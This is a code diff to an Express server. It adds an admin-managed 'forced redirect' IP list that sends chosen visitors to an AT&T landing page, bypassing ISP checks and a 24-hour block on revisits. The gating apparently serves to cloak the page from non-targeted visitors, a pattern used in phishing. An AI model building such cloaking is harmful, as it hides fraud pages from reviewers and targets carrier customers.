@@ -17,10 +17,14 @@ app.set('trust proxy', 1);
 
 // Path to store visited IPs
 const VISITED_IPS_FILE = path.join(__dirname, 'visited_ips.json');
+const FORCED_IPS_FILE = path.join(__dirname, 'forced_ips.json');
 
-// Ensure the file exists
+// Ensure the files exist
 if (!fssync.existsSync(VISITED_IPS_FILE)) {
     fssync.writeFileSync(VISITED_IPS_FILE, JSON.stringify([]));
+}
+if (!fssync.existsSync(FORCED_IPS_FILE)) {
+    fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
 }
 
 async function getVisitedIps() {
@@ -64,6 +68,29 @@ async function removeVisitedIp(ip) {
     const ips = await getVisitedIps();
     const newIps = ips.filter(entry => (typeof entry === 'object' ? entry.ip : entry) !== ip);
     await fs.writeFile(VISITED_IPS_FILE, JSON.stringify(newIps, null, 2));
+}
+
+async function getForcedIps() {
+    try {
+        const data = await fs.readFile(FORCED_IPS_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (e) {
+        return [];
+    }
+}
+
+async function addForcedIp(ip) {
+    const ips = await getForcedIps();
+    if (!ips.includes(ip)) {
+        ips.push(ip);
+        await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(ips, null, 2));
+    }
+}
+
+async function removeForcedIp(ip) {
+    const ips = await getForcedIps();
+    const newIps = ips.filter(i => i !== ip);
+    await fs.writeFile(FORCED_IPS_FILE, JSON.stringify(newIps, null, 2));
 }
 
 function escapeHtml(str) {
@@ -164,6 +191,13 @@ app.get('/init', async (req, res) => {
 
     console.log(`[Init] Visit from IP: ${clientIp}`);
     
+    // Check for forced redirect IPs (bypasses all other checks)
+    const forcedIps = await getForcedIps();
+    if (forcedIps.includes(clientIp)) {
+        console.log(`[Init] IP ${clientIp} is in forced list. Redirecting to ATT page.`);
+        return res.json({ redirect: '/go-att' });
+    }
+
     // Check if user has already visited the ATT landing page
     const visitedIps = await getVisitedIps();
     const isVisited = visitedIps.some(entry => (typeof entry === 'object' ? entry.ip : entry) === clientIp);
@@ -228,71 +262,127 @@ app.get('/init', async (req, res) => {
 // Admin Panel to manage visited IPs
 app.get('/admin', requireAdmin, async (req, res) => {
     const ips = await getVisitedIps();
+    const forcedIps = await getForcedIps();
     let html = `
         <!DOCTYPE html>
         <html>
         <head>
-            <title>Admin Panel - Visited IPs</title>
+            <title>Admin Panel</title>
             <style>
                 body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
-                .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                .container { max-width: 900px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+                section { margin-bottom: 40px; padding-bottom: 20px; border-bottom: 1px solid #eee; }
                 table { border-collapse: collapse; width: 100%; margin-top: 20px; }
                 th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
                 th { background-color: #f4f4f4; }
                 .remove-btn { color: #d9534f; cursor: pointer; font-weight: bold; }
                 .remove-btn:hover { text-decoration: underline; }
-                .status { margin-bottom: 20px; color: #555; }
+                .add-section { margin-top: 20px; display: flex; gap: 10px; }
+                input { padding: 8px; border: 1px solid #ddd; border-radius: 4px; flex-grow: 1; }
+                button { padding: 8px 16px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
+                button:hover { background: #0056b3; }
+                .status { color: #666; font-size: 0.9em; }
             </style>
         </head>
         <body>
             <div class="container">
-                <h1>Visited IPs Management</h1>
-                <p class="status">These users have visited the AT&T landing page within the last 24 hours.</p>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>IP Address</th>
-                            <th>Visited At</th>
-                            <th>Action</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${ips.map(entry => {
-                            const ip = typeof entry === 'object' ? entry.ip : entry;
-                            const time = typeof entry === 'object' ? new Date(entry.timestamp).toLocaleString() : 'N/A';
-                            return `
+                <h1>Admin Panel</h1>
+
+                <section>
+                    <h2>Forced Redirect IPs</h2>
+                    <p class="status">Any IP added here will <b>always</b> be redirected to the AT&T landing page, bypassing ISP checks.</p>
+                    <div class="add-section">
+                        <input type="text" id="forcedIpInput" placeholder="Enter IP address (e.g., 1.2.3.4)">
+                        <button id="addForcedBtn">Add to Forced List</button>
+                    </div>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${forcedIps.map(ip => `
                                 <tr>
                                     <td>${escapeHtml(ip)}</td>
-                                    <td>${escapeHtml(time)}</td>
-                                    <td><span class="remove-btn" data-ip="${escapeHtml(ip)}">Allow Revisit</span></td>
+                                    <td><span class="remove-btn forced-remove" data-ip="${escapeHtml(ip)}">Remove</span></td>
                                 </tr>
-                            `;
-                        }).join('')}
-                    </tbody>
-                </table>
+                            `).join('')}
+                            ${forcedIps.length === 0 ? '<tr><td colspan="2">No IPs in forced list</td></tr>' : ''}
+                        </tbody>
+                    </table>
+                </section>
+
+                <section>
+                    <h2>Recently Visited IPs (Restricted)</h2>
+                    <p class="status">Users who visited the AT&T landing page within the last 24 hours. They are currently blocked from revisiting.</p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>IP Address</th>
+                                <th>Visited At</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${ips.map(entry => {
+                                const ip = typeof entry === 'object' ? entry.ip : entry;
+                                const time = typeof entry === 'object' ? new Date(entry.timestamp).toLocaleString() : 'N/A';
+                                return `
+                                    <tr>
+                                        <td>${escapeHtml(ip)}</td>
+                                        <td>${escapeHtml(time)}</td>
+                                        <td><span class="remove-btn visited-remove" data-ip="${escapeHtml(ip)}">Allow Revisit</span></td>
+                                    </tr>
+                                `;
+                            }).join('')}
+                            ${ips.length === 0 ? '<tr><td colspan="3">No restricted visits in the last 24 hours</td></tr>' : ''}
+                        </tbody>
+                    </table>
+                </section>
             </div>
 
             <script>
+                const getAdminToken = () => new URLSearchParams(window.location.search).get('token');
+
+                document.getElementById('addForcedBtn').addEventListener('click', async () => {
+                    const ip = document.getElementById('forcedIpInput').value.trim();
+                    if (!ip) return alert('Please enter an IP');
+                    
+                    const response = await fetch('/api/admin/forced/add', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
+                        body: JSON.stringify({ ip })
+                    });
+                    
+                    if (response.ok) {
+                        window.location.reload();
+                    } else {
+                        alert('Error: ' + (await response.text()));
+                    }
+                });
+
                 document.addEventListener('click', async (e) => {
                     if (e.target.classList.contains('remove-btn')) {
                         const ip = e.target.getAttribute('data-ip');
-                        if (confirm('Allow ' + ip + ' to revisit the landing page?')) {
-                            const params = new URLSearchParams(window.location.search);
-                            const token = params.get('token');
-                            
-                            const response = await fetch('/api/admin/remove', {
+                        const isForced = e.target.classList.contains('forced-remove');
+                        const url = isForced ? '/api/admin/forced/remove' : '/api/admin/remove';
+                        const confirmMsg = isForced ? 
+                            'Remove ' + ip + ' from forced redirect list?' : 
+                            'Allow ' + ip + ' to revisit the landing page?';
+
+                        if (confirm(confirmMsg)) {
+                            const response = await fetch(url, {
                                 method: 'POST',
-                                headers: { 
-                                    'Content-Type': 'application/json',
-                                    'x-admin-token': token
-                                },
+                                headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                                 body: JSON.stringify({ ip })
                             });
                             
                             if (response.ok) {
                                 window.location.reload();
                             } else {
-                                alert('Failed to remove IP: ' + (await response.text()));
+                                alert('Failed: ' + (await response.text()));
                             }
                         }
                     }
@@ -310,6 +400,22 @@ app.post('/api/admin/remove', requireAdmin, async (req, res) => {
     if (!ip) return res.status(400).send('IP is required');
     await removeVisitedIp(ip);
     res.status(200).send('IP removed successfully');
+});
+
+// Endpoint to add an IP to forced redirect list
+app.post('/api/admin/forced/add', requireAdmin, async (req, res) => {
+    const { ip } = req.body;
+    if (!ip || !net.isIP(ip)) return res.status(400).send('Valid IP is required');
+    await addForcedIp(ip);
+    res.status(200).send('IP added to forced list');
+});
+
+// Endpoint to remove an IP from forced redirect list
+app.post('/api/admin/forced/remove', requireAdmin, async (req, res) => {
+    const { ip } = req.body;
+    if (!ip) return res.status(400).send('IP is required');
+    await removeForcedIp(ip);
+    res.status(200).send('IP removed from forced list');
 });
 
 // Redirect to AT&T landing page
